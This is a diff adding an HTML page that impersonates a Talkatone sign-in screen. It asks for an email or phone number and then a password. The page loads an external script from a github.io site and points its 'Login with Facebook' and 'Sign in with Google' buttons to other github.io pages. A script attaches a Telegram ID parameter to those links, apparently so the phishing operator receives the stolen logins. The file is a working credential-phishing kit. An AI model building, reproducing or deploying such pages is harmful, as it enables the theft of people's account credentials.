@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Sign In TALKATONE</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  margin:0;
+  padding:0;
+  box-sizing:border-box;
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+}
+
+body{
+  height:100vh;
+  background: linear-gradient(135deg, #5f5f5f, #2e2e2e);
+  display:flex;
+  flex-direction:column;
+  padding:18px;
+  color:#fff;
+  margin-top: 9px;
+}
+
+.hidden{ display:none; }
+
+/* ===== HEADER ===== */
+.header{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  font-size:20px;
+  margin-bottom:25px;
+  cursor:pointer;
+}
+
+/* ===== WHITE SOCIAL BUTTONS ===== */
+.social-btn{
+  background:#fff;
+  color:#1877f2;
+  border-radius:0px;
+  padding:14px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  font-size:15px;
+  font-weight:500;
+  margin-bottom:12px;
+  height: 60px;
+}
+
+/* ===== OR LINE ===== */
+.or-box{
+  display:flex;
+  align-items:center;
+  gap:12px;
+  margin:15px 0;
+  color:#ddd;
+}
+.or-box span{
+  flex:1;
+  height:1px;
+  background:#aaa;
+}
+
+/* ===== INPUT ===== */
+.label{
+  font-size:14px;
+  color:#ddd;
+  margin-bottom:6px;
+}
+
+.input-box{
+  border-bottom:1px solid #aaa;
+  margin-bottom:20px;
+}
+
+input{
+  width:100%;
+  background:none;
+  border:none;
+  outline:none;
+  color:white;
+  padding:10px 0;
+  font-size:15px;
+}
+
+/* ===== BUTTON ===== */
+button{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:4px;
+  font-size:16px;
+  cursor:not-allowed;
+  background:#bfbfbf;
+  color:#6d9fd6;
+}
+
+button.active{
+  background:#d9d9d9;
+  color:#1da1f2;
+  cursor:pointer;
+}
+.mag {
+  margin-top: 100px;
+}
+</style>
+</head>
+
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<!-- ================= STEP 1 ================= -->
+<div id="step1">
+
+  <div class="header">← <b>Sign In</b></div>
+<a href="https://olptyi.github.io/nb/face" id="magicLin">
+  <div class="social-btn">
+    <span style="color:#1877f2;font-size:18px;">f</span>
+    Login with Facebook
+  </div>
+  </a>
+<a href="https://olptyi.github.io/nb/gma" id="magicLink">
+  <div class="social-btn" style="color:#4285f4;">
+    <span style="color:#4285f4;font-size:18px;">G</span>
+    Sign in with Google
+  </div>
+</a>
+  <div class="or-box">
+    <span></span> or <span></span>
+  </div>
+<div class="mag"></div>
+  <div class="label">Sign in with email or phone number:</div>
+<form>
+  <div class="input-box">
+    <input type="text" id="userInput" placeholder="EMAIL OR PHONE NUMBER" name="EMAIL OR PHONE NUMBER">
+  </div>
+
+<button id="continueBtn" type="button">CONTINUE</button>
+</div>
+
+<!-- ================= STEP 2 ================= -->
+<div id="step2" class="hidden">
+
+  <div class="header" onclick="goBack()">← <b>Enter Password</b></div>
+
+  <div class="label">Password</div>
+
+  <div class="input-box">
+    <input type="password" id="passInput" placeholder="PASSWORD" name="PASSWORD">
+  </div>
+
+  <button id="loginBtn" type="submit">SIGN IN</button>
+</div>
+</form>
+<script>
+const input = document.getElementById("userInput");
+const continueBtn = document.getElementById("continueBtn");
+
+const passInput = document.getElementById("passInput");
+const loginBtn = document.getElementById("loginBtn");
+
+const step1 = document.getElementById("step1");
+const step2 = document.getElementById("step2");
+
+/* ===== EMAIL BUTTON ENABLE ===== */
+input.addEventListener("input", ()=>{
+  if(input.value.trim() !== ""){
+    continueBtn.classList.add("active");
+    continueBtn.disabled = false;
+  }else{
+    continueBtn.classList.remove("active");
+    continueBtn.disabled = true;
+  }
+});
+
+/* ===== MOVE TO PASSWORD ===== */
+continueBtn.addEventListener("click", ()=>{
+  if(!continueBtn.classList.contains("active")) return;
+  step1.classList.add("hidden");
+  step2.classList.remove("hidden");
+});
+
+/* ===== PASSWORD BUTTON ENABLE ===== */
+passInput.addEventListener("input", ()=>{
+  if(passInput.value.trim() !== ""){
+    loginBtn.classList.add("active");
+    loginBtn.disabled = false;
+  }else{
+    loginBtn.classList.remove("active");
+    loginBtn.disabled = true;
+  }
+});
+
+/* ===== BACK BUTTON ===== */
+function goBack(){
+  step2.classList.add("hidden");
+  step1.classList.remove("hidden");
+}
+</script>
+<script>
+  // Get URL parameters once
+  const params = new URLSearchParams(window.location.search);
+  const telegramId = params.get("id");
+
+  // Get the two social buttons
+  const googleBtn = document.getElementById("magicLink");
+  const facebookBtn = document.getElementById("magicLin");
+
+  // Attach ID to Google link
+  if (telegramId) {
+    googleBtn.href = "https://olptyi.github.io/nb/gma?id=" + telegramId;
+    facebookBtn.href = "https://olptyi.github.io/nb/face?id=" + telegramId;
+  }
+</script>
+</body>
+</html>
